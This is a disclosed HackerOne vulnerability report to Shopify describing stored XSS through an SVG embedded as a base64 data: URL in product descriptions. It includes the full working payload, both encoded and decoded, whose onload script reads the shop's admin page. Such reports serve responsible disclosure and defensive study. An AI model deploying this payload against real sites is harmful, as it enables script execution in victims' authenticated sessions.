# Stored XSS in SVG file as data: url

## Report Details
- **Report ID**: 1276742
- **URL**: https://hackerone.com/reports/1276742
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-07-24T15:15:36.857Z
- **Disclosed**: 2023-01-31T19:46:32.755Z

## Reporter
- **Username**: irisrumtub
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi Shopify team, 

In rich text editors (products, gifts, pages, etc) you allow *data:*  URLs to be set as image sources, and I was able to store XSS in such image. While <img> won't execute script that is stored inside the SVG it points to, if one opens the image, the script will be executed. What is important here is that you actually can use javascript here to access /admin area.

#Steps to reproduce:
1. Create a product with such html description:
```html
<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9InZhciByZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsgcmVxLm9wZW4oJ0dFVCcsICdodHRwczovL3VzLWJhc2VkLW9yZ2FuaXphdGlvbi1oMS5teXNob3BpZnkuY29tL2FkbWluJywgZmFsc2UpOyByZXEuc2V0UmVxdWVzdEhlYWRlcignVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cycsICcxJyk7cmVxLnNldFJlcXVlc3RIZWFkZXIoJ1VzZXItQWdlbnQnLCAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc1LjAuMzc3MC4xMDAgU2FmYXJpLzUzNy4zNicpIDtyZXEuc2VuZChudWxsKTt2YXIgaGVhZGVycyA9IHJlcS5yZXNwb25zZS50b0xvd2VyQ2FzZSgpO2NvbnNvbGUubG9nKGhlYWRlcnMpOyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmVyc2lvbj0iMS4xIiBpZD0iTGF5ZXJfMSIgeD0iMHB4IiB5PSIwcHgiIHZpZXdCb3g9IjAgMCAxMDAgMTAwIiBlbmFibGUtYmFja2dyb3VuZD0ibmV3IDAgMCAxMDAgMTAwIiB4bWw6c3BhY2U9InByZXNlcnZlIiBoZWlnaHQ9IjEwMHB4IiB3aWR0aD0iMTAwcHgiPgo8Zz4KCTxwYXRoIGQ9Ik0yOC4xLDM2LjZjNC42LDEuOSwxMi4yLDEuNiwyMC45LDEuMWM4LjktMC40LDE5LTAuOSwyOC45LDAuOWM2LjMsMS4yLDExLjksMy4xLDE2LjgsNmMtMS41LTEyLjItNy45LTIzLjctMTguNi0zMS4zICAgYy00LjktMC4yLTkuOSwwLjMtMTQuOCwxLjRDNDcuOCwxNy45LDM2LjIsMjUuNiwyOC4xLDM2LjZ6Ii8+Cgk8cGF0aCBkPSJNNzAuMyw5LjhDNTcuNSwzLjQsNDIuOCwzLjYsMzAuNSw5LjVjLTMsNi04LjQsMTkuNi01LjMsMjQuOWM4LjYtMTEuNywyMC45LTE5LjgsMzUuMi0yMy4xQzYzLjcsMTAuNSw2NywxMCw3MC4zLDkuOHoiLz4KCTxwYXRoIGQ9Ik0xNi41LDUxLjNjMC42LTEuNywxLjItMy40LDItNS4xYy0zLjgtMy40LTcuNS03LTExLTEwLjhjLTIuMSw2LjEtMi44LDEyLjUtMi4zLDE4LjdDOS42LDUxLjEsMTMuNCw1MC4yLDE2LjUsNTEuM3oiLz4KCTxwYXRoIGQ9Ik05LDMxLjZjMy41LDMuOSw3LjIsNy42LDExLjEsMTEuMWMwLjgtMS42LDEuNy0zLjEsMi42LTQuNmMwLjEtMC4yLDAuMy0wLjQsMC40LTAuNmMtMi45LTMuMy0zLjEtOS4yLTAuNi0xNy42ICAgYzAuOC0yLjcsMS44LTUuMywyLjctNy40Yy01LjIsMy40LTkuOCw4LTEzLjMsMTMuN0MxMC44LDI3LjksOS44LDI5LjcsOSwzMS42eiIvPgoJPHBhdGggZD0iTTE1LjQsNTQuN2MtMi42LTEtNi4xLDAuNy05LjcsMy40YzEuMiw2LjYsMy45LDEzLDgsMTguNUMxMyw2OS4zLDEzLjUsNjEuOCwxNS40LDU0Ljd6Ii8+Cgk8cGF0aCBkPSJNMzkuOCw1Ny42QzU0LjMsNjYuNyw3MCw3Myw4Ni41LDc2LjRjMC42LTAuOCwxLjEtMS42LDEuNy0yLjVjNC44LTcuNyw3LTE2LjMsNi44LTI0LjhjLTEzLjgtOS4zLTMxLjMtOC40LTQ1LjgtNy43ICAgYy05LjUsMC41LTE3LjgsMC45LTIzLjItMS43Yy0wLjEsMC4xLTAuMiwwLjMtMC4zLDAuNGMtMSwxLjctMiwzLjQtMi45LDUuMUMyOC4yLDQ5LjcsMzMuOCw1My45LDM5LjgsNTcuNnoiLz4KCTxwYXRoIGQ9Ik0yNi4yLDg4LjJjMy4zLDIsNi43LDMuNiwxMC4yLDQuN2MtMy41LTYuMi02LjMtMTIuNi04LjgtMTguNWMtMy4xLTcuMi01LjgtMTMuNS05LTE3LjJjLTEuOSw4LTIsMTYuNC0wLjMsMjQuNyAgIEMyMC42LDg0LjIsMjMuMiw4Ni4zLDI2LjIsODguMnoiLz4KCTxwYXRoIGQ9Ik0zMC45LDczYzIuOSw2LjgsNi4xLDE0LjQsMTAuNSwyMS4yYzE1LjYsMywzMi0yLjMsNDIuNi0xNC42QzY3LjcsNzYsNTIuMiw2OS42LDM3LjksNjAuN0MzMiw1NywyNi41LDUzLDIxLjMsNDguNiAgIGMtMC42LDEuNS0xLjIsMy0xLjcsNC42QzI0LjEsNTcuMSwyNy4zLDY0LjUsMzAuOSw3M3oiLz4KPC9nPgo8L3N2Zz4=" alt="">
```
Inside this base 64 is code like this:

```html
<svg onload="var req = new XMLHttpRequest(); req.open('GET', 'https://us-based-organization-h1.myshopify.com/admin', false); req.setRequestHeader('Upgrade-Insecure-Requests', '1');req.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36') ;req.send(null);var headers = req.response.toLowerCase();console.log(headers);" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve" height="100px" width="100px">
<g>
	<path d="M28.1,36.6c4.6,1.9,12.2,1.6,20.9,1.1c8.9-0.4,19-0.9,28.9,0.9c6.3,1.2,11.9,3.1,16.8,6c-1.5-12.2-7.9-23.7-18.6-31.3   c-4.9-0.2-9.9,0.3-14.8,1.4C47.8,17.9,36.2,25.6,28.1,36.6z"/>
	<path d="M70.3,9.8C57.5,3.4,42.8,3.6,30.5,9.5c-3,6-8.4,19.6-5.3,24.9c8.6-11.7,20.9-19.8,35.2-23.1C63.7,10.5,67,10,70.3,9.8z"/>
	<path d="M16.5,51.3c0.6-1.7,1.2-3.4,2-5.1c-3.8-3.4-7.5-7-11-10.8c-2.1,6.1-2.8,12.5-2.3,18.7C9.6,51.1,13.4,50.2,16.5,51.3z"/>
	<path d="M9,31.6c3.5,3.9,7.2,7.6,11.1,11.1c0.8-1.6,1.7-3.1,2.6-4.6c0.1-0.2,0.3-0.4,0.4-0.6c-2.9-3.3-3.1-9.2-0.6-17.6   c0.8-2.7,1.8-5.3,2.7-7.4c-5.2,3.4-9.8,8-13.3,13.7C10.8,27.9,9.8,29.7,9,31.6z"/>
	<path d="M15.4,54.7c-2.6-1-6.1,0.7-9.7,3.4c1.2,6.6,3.9,13,8,18.5C13,69.3,13.5,61.8,15.4,54.7z"/>
	<path d="M39.8,57.6C54.3,66.7,70,73,86.5,76.4c0.6-0.8,1.1-1.6,1.7-2.5c4.8-7.7,7-16.3,6.8-24.8c-13.8-9.3-31.3-8.4-45.8-7.7   c-9.5,0.5-17.8,0.9-23.2-1.7c-0.1,0.1-0.2,0.3-0.3,0.4c-1,1.7-2,3.4-2.9,5.1C28.2,49.7,33.8,53.9,39.8,57.6z"/>
	<path d="M26.2,88.2c3.3,2,6.7,3.6,10.2,4.7c-3.5-6.2-6.3-12.6-8.8-18.5c-3.1-7.2-5.8-13.5-9-17.2c-1.9,8-2,16.4-0.3,24.7   C20.6,84.2,23.2,86.3,26.2,88.2z"/>
	<path d="M30.9,73c2.9,6.8,6.1,14.4,10.5,21.2c15.6,3,32-2.3,42.6-14.6C67.7,76,52.2,69.6,37.9,60.7C32,57,26.5,53,21.3,48.6   c-0.6,1.5-1.2,3-1.7,4.6C24.1,57.1,27.3,64.5,30.9,73z"/>
</g>
</svg>
```
In this example i request my shop's admin page and in the video it looks like CORS is okay with it.

2. Open the resulting image in new tab and observe script execution in console.

#POC video:
█████

## Impact

With little user interaction we can execute arbitrary scripts in victim's account.

## Attachments
No attachments
